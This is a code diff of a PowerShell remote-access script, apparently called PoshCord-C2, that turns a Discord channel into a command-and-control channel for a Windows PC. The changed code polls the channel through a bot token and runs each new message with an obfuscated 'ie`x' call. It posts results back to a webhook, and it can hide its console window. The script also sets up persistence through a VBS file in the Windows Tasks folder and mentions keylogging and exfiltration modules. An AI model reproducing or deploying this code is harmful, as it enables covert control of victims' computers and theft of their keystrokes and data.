@@ -4,16 +4,16 @@
 Using a Discord Server Chat and a hosted text file to Act as a Command and Control Platform.
 
 INFORMATION
-This script will wait until it notices a change in the contents of a text file hosted online (eg. pastebin or github).
-Every 10 seconds it will check a file for a change in the file contents and interpret it as a custom command / module.
-
-** Using github to host your command file will take up to 5 minutes to run each module - Use https://pastebin.com and create an account to make an editable text file **
+This script uses a discord bot along with discords API and a webhook to create a chat that can control a windows pc.
+Every 10 seconds it will check for a new message in chat and interpret it as a custom command / module in powershell.
 
 SETUP
-1. Goto https://pastebin.com and make an account..
-2. Create an empty paste/file and copy the RAW url.
-3. Change YOUR_FILE_URL to the RAW url  eg. https://pastebin.com/raw/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
-4. Change YOUR_WEBHOOK_URL to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+1. make a discord bot at https://discord.com/developers/applications/
+2. add the bot to your discord server
+3. create a webhook in the desired channel on your server. ( channel-settings/integrations )
+3. Change YOUR_WEBHOOK_URL to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+4. Change YOUR_BOT_TOKEN_HERE with your bot token
+5. Change WEBHOOK_CHANNEL_ID to the channel id of your webhook.
 
 USAGE
 1. Setup the script
@@ -30,15 +30,16 @@ Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and re
 #>
 
 # Uncomment the lines below and add your details
-# $hookurl = "YOUR_WEBHOOK_URL" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
-# $GHurl = "YOUR_FILE_URL"  # eg. https://pastebin.com/raw/QtCxxxx
+$hookurl = "YOUR_WEBHOOK_HERE" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+$token = "YOUR_BOT_TOKEN_HERE" # make sure your bot is in the same server as the webhook
+$channel_id = 'WEBHOOK_CHANNEL_ID' # make sure the bot AND webhook can access this channel
 
-if ($hookurl.Ln -eq 0){$hookurl = "$dc"}
+if ($hookurl -like "YOUR_WEBHOOK_HERE"){$hookurl = "$dc"}
 # Shortened webhook detection
 if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
 
 # HIDE THE WINDOW - Change to 1 to hide the console window
-$HideWindow = 1
+$HideWindow = 0
 If ($HideWindow -gt 0){
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -82,7 +83,29 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){
 }
 
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
-$response = Invoke-RestMethod -Uri $GHurl
+$response = $null
+$previouscmd = $null
+function PullMsg {
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", $headers.Authorization)
+    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$channel_id/messages")
+    
+    if ($response) {
+        $most_recent_message = ($response | ConvertFrom-Json)[0]
+        if (-not $most_recent_message.author.bot) {
+            $response = $most_recent_message.content
+            $script:response = $response
+        }
+    } else {
+        Write-Output "No messages found in the channel."
+    }
+}
+
+PullMsg
+
 $previouscmd = $response
 
 $noraw = $ghurl -replace "/raw", ""
@@ -919,30 +942,30 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 }
 
 while($true){
-    $response = Invoke-RestMethod -Uri $GHurl
 
-    if (!($response -match "$previouscmd")) {
+    PullMsg
+
+    if (!($response -like "$previouscmd")) {
     Write-Output "Command found!"
-        if ($response -match "close") {
+        if ($response -like "close") {
             $previouscmd = $response        
             $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Closing Session.`` :octagonal_sign:"} | ConvertTo-Json
             Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
             break
         }
-        elseif (!($response -match "$previouscmd")) {
+        elseif (!($response -like "$previouscmd")) {
             $Result=ie`x($response) -ErrorAction Stop
             if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")){
-                $previouscmd = $response
+                $script:previouscmd = $response
             }
             else{
-                $previouscmd = $response
+                $script:previouscmd = $response
                 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``$Result``"} | ConvertTo-Json
                 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
             }
         }
     }
     else{
-    write-output "No command found.."
     }
 sleep 5
 }
